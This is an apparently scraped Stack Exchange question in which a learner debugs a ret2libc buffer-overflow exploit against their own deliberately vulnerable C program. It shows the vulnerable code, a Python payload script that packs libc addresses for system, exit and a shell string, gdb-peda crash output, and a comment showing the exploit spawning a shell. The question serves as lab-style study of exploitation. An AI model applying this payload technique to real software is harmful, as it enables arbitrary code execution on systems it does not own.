{
    "title": "ret2libc exploit issue",
    "link": "https://reverseengineering.stackexchange.com/questions/25871/ret2libc-exploit-issue",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>i have some code in c i am working to write exploit for it:</p>\n<pre><code>#include &lt;stdio.h&gt;    \nvoid secretFunction()\n{\n            printf(\"Congratulations!\\n\");\n            printf(\"You have entered in the secret function!\\n\");\n}\n\nvoid echo()\n{\n            char buffer[20];\n            printf(\"Enter some text:\\n\");\n            scanf(\"%s\", buffer);\n            printf(\"You entered: %s\\n\", buffer);\n}\n\nint main()\n{\n            echo();\n            return 0;\n}\n</code></pre>\n<p>and i wrote the exploit script in python:</p>\n<pre><code>#!/bin/env python\nimport struct\nsystem_addr = struct.pack(\"&lt;I\", 0xb7e1d200)\nshell_addr = struct.pack(\"&lt;I\", 0xb7f5e0cf)\nexit_addr = struct.pack(\"&lt;I\", 0xb7deeaac)\nbuf = \"A\" * 32\nbuf += system_addr\nbuf += exit_addr\nbuf += shell_addr\nprint buf\n</code></pre>\n<p>in gdb:\ngdb-peda$ r &lt;&lt;&lt; $(python exploit_scanf.py)</p>\n<p>it gave me:</p>\n<pre><code>[----------------------------------registers-----------------------------------]\nEAX: 0x38 ('8')\nEBX: 0x42424242 ('BBBB')\nECX: 0x0\nEDX: 0xb7fb9890 --&gt; 0x0\nESI: 0xb7fb8000 --&gt; 0x1d7d6c\nEDI: 0x0\nEBP: 0xd2424242\nESP: 0xbffff470 --&gt; 0xe0cfb7de\nEIP: 0xeaacb7e1\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0xeaacb7e1\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff470 --&gt; 0xe0cfb7de\n0004| 0xbffff474 --&gt; 0xbf00b7f5\n0008| 0xbffff478 --&gt; 0x0\n0012| 0xbffff47c --&gt; 0xb7df8e81 (&lt;__libc_start_main+241&gt;:       add    esp,0x10)\n0016| 0xbffff480 --&gt; 0xb7fb8000 --&gt; 0x1d7d6c\n0020| 0xbffff484 --&gt; 0xb7fb8000 --&gt; 0x1d7d6c\n0024| 0xbffff488 --&gt; 0x0\n0028| 0xbffff48c --&gt; 0xb7df8e81 (&lt;__libc_start_main+241&gt;:       add    esp,0x10)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0xeaacb7e1 in ?? ()\n</code></pre>\n<p>and sometimes it gave me:</p>\n<pre><code>/bin/bash: warning: command substitution: ignored null byte in input\n</code></pre>\n<p>and no redirect to shell , what is the issue with ret2libc exploit?</p>\n</div>",
    "votes": "0",
    "answers": 0,
    "views": "100",
    "tags": [
        "gdb"
    ],
    "user": "abdullah",
    "time": "Sep 13, 2020 at 13:56",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<span class=\"comment-copy\">try saving the output from the script into a file an then redirect it via <code>r &lt; input</code> in gdb. Will it give the same bash errors?</span>",
            "time": null
        },
        {
            "user": "abdullah",
            "text": "<span class=\"comment-copy\">gdb-peda$ r &lt; exp.md Starting program: /home/mal/buffer_overflow_lab/01_stack_overflow_scanf_example &lt; exp.md Enter some text: You entered: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB [New process 26043] process 26043 is executing new program: /bin/dash [New process 26285] process 26285 is executing new program: /bin/dash [Inferior 3 (process 26285) exited normally] Warning: not running or target is remote</span>",
            "time": null
        }
    ],
    "answers_data": []
}